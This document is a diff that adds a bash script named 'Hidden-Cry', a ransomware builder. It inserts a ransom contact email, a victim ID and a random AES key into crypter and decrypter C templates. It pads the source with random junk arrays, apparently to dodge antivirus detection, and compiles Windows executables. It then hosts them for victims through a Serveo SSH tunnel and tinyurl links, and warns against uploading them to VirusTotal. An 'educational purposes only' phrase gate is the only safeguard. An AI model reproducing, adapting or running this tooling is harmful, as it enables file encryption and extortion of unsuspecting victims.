@@ -1,0 +1,234 @@
+#!/bin/bash
+# Hidden-Cry v1.0
+# Coded by @linux_choice (Don't change! Read the License!)
+# Github: https://github.com/thelinuxchoice/hidden-cry
+# Disclaimer:
+
+host="http://serveo.net" #"159.89.214.31" #Serveo.net (Port Forwarding Tunneling)
+
+trap 'printf "\n";stop' 2
+
+warning() {
+printf "\n"
+printf " \n  \e[1;41mUsage of Hidden-Cry is COMPLETE RESPONSABILITY of the END-USER. \e[0m\n"
+printf "  \e[1;41mDevelopers assume no liability and are NOT responsible for any  \e[0m\n"
+printf "  \e[1;41mmisuse or damage caused by this program.                        \e[0m\n"
+printf "\n"
+printf "  \e[1;77mI am using Hidden-Cry for educational purposes only\e[0m\n"
+read -p $'  \e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m]\e[1;93mCopy and paste the above phrase:\e[0m ' end_user
+
+if [[ "$end_user" != "I am using Hidden-Cry for educational purposes only" ]]; then
+exit 1
+fi 
+
+}
+
+
+banner() {
+
+printf "    \e[1;93m _     _ _     _     _                 ______              \n"
+printf "    | |   | (_)   | |   | |               / _____)             \n"
+printf "    | |__ | |_  _ | | _ | | ____ ____ ___| /       ____ _   _  \n"
+printf "    |  __)| | |/ || |/ || |/ _  )  _ (___) |      / ___) | | | \n"
+printf "    | |   | | ( (_| ( (_| ( (/ /| | | |  | \_____| |   | |_| | \n"
+printf "    |_|   |_|_|\____|\____|\____)_| |_|   \______)_|    \__  | \n"
+printf "                                                       (____/\e[0m\e[1;77mv1.0\e[0m  \n"
+printf "\n"
+printf "\e[1;77m       Coded by: https://github.com/thelinuxchoice/hidden-cry\e[0m"
+}
+
+
+stop() {
+
+if [[ $checkphp == *'php'* ]]; then
+killall -2 php > /dev/null 2>&1
+fi
+if [[ $checkssh == *'ssh'* ]]; then
+killall -2 ssh > /dev/null 2>&1
+fi
+exit 1
+
+}
+
+dependencies() {
+
+command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
+command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; } 
+command -v i686-w64-mingw32-gcc > /dev/null 2>&1 || { echo >&2 "I require mingw-w64 but it's not installed. Install it: apt-get update & apt-get install -y mingw-w64 .Aborting."; 
+exit 1; }
+command -v openssl > /dev/null 2>&1 || { echo >&2 "I require openssl but it's not installed. Install it. .Aborting."; exit 1; }
+command -v base64 > /dev/null 2>&1 || { echo >&2 "I require base64 but it's not installed. Install it: \"bash install.sh\" .Aborting."; 
+exit 1; }
+
+
+}
+
+server() {
+
+cd $your_id
+printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Starting Serveo...\e[0m"
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net  2> /dev/null > sendlink ' &
+php -S localhost:$port > /dev/null 2>&1 &
+sleep 8
+send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
+printf "\n"
+printf '\n\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Crypter:\e[0m\e[1;77m %s/%s.exe \e[0m' $send_link $payload_name
+printf '\n\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Decrypter:\e[0m\e[1;77m %s/%s.decrypter.exe \e[0m' $send_link $payload_name
+send_ipc=$(curl -s http://tinyurl.com/api-create.php?url=$send_link/$payload_name.exe | head -n1)
+send_ipd=$(curl -s http://tinyurl.com/api-create.php?url=$send_link/$payload_name.decrypter.exe | head -n1)
+printf '\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Or using tinyurl:\e[0m'
+printf "\n"
+printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Crypter:\e[0m\e[1;77m %s\e[0m\n" $send_ipc
+printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Decrypter:\e[0m\e[1;77m %s\e[0m" $send_ipd
+printf "\n"
+printf '\e[1;92m[\e[0m\e[1;77m!\e[0m\e[1;92m] Press Ctrl + c to stop server...\e[0m\n'
+
+while [ True ]; do
+sleep 3
+done
+
+}
+
+compile() {
+
+if [[ ! -e cry.c ]]; then
+printf "\e[1;93m[!] Error...\e[0m\n"
+exit 1
+else
+printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Compiling... \e[0m\n"
+#i686-w64-mingw32-windres icon.rc -O coff -o my.res
+i686-w64-mingw32-gcc cry.c -o $your_id/$payload_name.exe  -lws2_32
+i686-w64-mingw32-gcc decry.c -o $your_id/$payload_name.decrypter.exe  -lws2_32
+#i686-w64-mingw32-gcc cry.c my.res -o $payload_name.exe -lws2_32
+printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Crypter Saved:\e[0m\e[1;77m %s/%s.exe\n" $your_id  $payload_name
+printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Decrypter Saved:\e[0m\e[1;77m %s/%s.decrypter.exe\n" $your_id  $payload_name
+printf "\e[1;93m[\e[0m\e[1;77m!\e[0m\e[1;93m] Please, don't upload to virustotal.com !\e[0m\n"
+rm -rf cry.c decry.c
+#rm -rf icon.rc
+#rm -rf my.res
+fi
+
+}
+
+icon() {
+
+default_payload_icon="icon/messenger.ico"
+printf '\n\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Put ICON path (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_payload_icon
+read payload_icon
+payload_icon="${payload_icon:-${default_payload_icon}}"
+
+if [[ ! -e $payload_icon ]]; then
+printf '\n\e[1;93m[\e[0m\e[1;77m!\e[0m\e[1;93m] File not Found! Try Again! \e[0m\n'
+icon
+else
+if [[ $payload_icon != *.ico ]]; then
+printf '\n\e[1;93m[\e[0m\e[1;77m!\e[0m\e[1;93m] Please, use *.ico file format. Try Again! \e[0m\n'
+icon
+fi
+fi
+
+}
+
+start() {
+
+default_port=$(seq 1111 4444 | sort -R | head -n1)
+#printf '\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port (Random:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_port
+#read port
+port="${port:-${default_port}}"
+default_payload_name="payload"
+printf '\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Payload name (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_payload_name
+read payload_name
+payload_name="${payload_name:-${default_payload_name}}"
+default_rescue_email="email@protonmail.com"
+printf '\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Rescue Email: \e[0m'
+read rescue_email
+rescue_email="${rescue_email:-${default_rescue_email}}"
+code_id1=$(openssl rand -hex 32 | cut -c 1-4)
+code_id2=$(openssl rand -hex 32 | cut -c 1-4)
+code_id3=$(openssl rand -hex 32 | cut -c 1-4)
+your_id="$code_id1-$code_id2-$code_id3"
+key=$(echo -n $(openssl rand -hex 32 | cut -c 1-32) | base64)
+printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Generating Crypter and Decrypter\e[0m\n"
+printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Target ID:\e[0m\e[1;77m %s\e[0m\n" $your_id
+printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Random AES 256 bits Key:\e[0m \e[1;77m%s\e[0m\n" $key
+mkdir $your_id
+printf "\nTarget ID: %s\n" $your_id >> $your_id/key.txt
+printf "Key: %s\n" $key >> $your_id/key.txt
+#icon
+payload
+compile
+server
+
+}
+
+#generatePadding function from powerfull.sh file (by https://github.com/Screetsec/TheFatRat/blob/master/powerfull.sh)
+function generatePadding {
+
+    paddingArray=(0 1 2 3 4 5 6 7 8 9 a b c d e f)
+
+    counter=0
+    randomNumber=$((RANDOM%${randomness}+23))
+    while [  $counter -lt $randomNumber ]; do
+        echo "" >> cry.c
+        echo "" >> decry.c
+	randomCharnameSize=$((RANDOM%10+7))
+        randomCharname=`cat /dev/urandom | tr -dc 'a-zA-Z' | head -c ${randomCharnameSize}`
+	echo "unsigned char ${randomCharname}[]=" >> cry.c
+	echo "unsigned char ${randomCharname}[]=" >> decry.c
+    	randomLines=$((RANDOM%20+13))
+	for (( c=1; c<=$randomLines; c++ ))
+	do
+		randomString="\""
+		randomLength=$((RANDOM%11+7))
+		for (( d=1; d<=$randomLength; d++ ))
+		do
+			randomChar1=${paddingArray[$((RANDOM%15))]}
+			randomChar2=${paddingArray[$((RANDOM%15))]}
+			randomPadding=$randomChar1$randomChar2
+	        	randomString="$randomString\\x$randomPadding"
+		done
+		randomString="$randomString\""
+		if [ $c -eq ${randomLines} ]; then
+			echo "$randomString;" >> cry.c
+			echo "$randomString;" >> decry.c
+
+		else
+			echo $randomString >> cry.c
+			echo $randomString >> decry.c
+		fi
+	done
+        let counter=counter+1
+    done
+}
+
+payload() {
+
+
+printf "#include <stdio.h>\n" > cry.c
+printf "#include <winsock2.h>\n" >> cry.c
+printf "#include <windows.h>\n" >> cry.c
+
+printf "#include <stdio.h>\n" > decry.c
+printf "#include <winsock2.h>\n" >> decry.c
+printf "#include <windows.h>\n" >> decry.c
+generatePadding
+generatePadding
+generatePadding
+generatePadding
+sed 's+email_rescue+'$rescue_email'+g' crypter.c | sed 's+your_id+'$your_id'+g' | sed 's+secretkey+'$key'+g' > newcrypter.c
+sed 's+secretkey+'$key'+g' decrypter.c > newdecrypter.c
+cat newcrypter.c >> cry.c
+cat newdecrypter.c >> decry.c
+rm -rf newcrypter.c newdecrypter.c
+generatePadding
+generatePadding
+generatePadding
+generatePadding
+#printf "id ICON \"%s\"" $payload_icon  > icon.rc
+
+}
+
+banner
+dependencies
+warning
+start
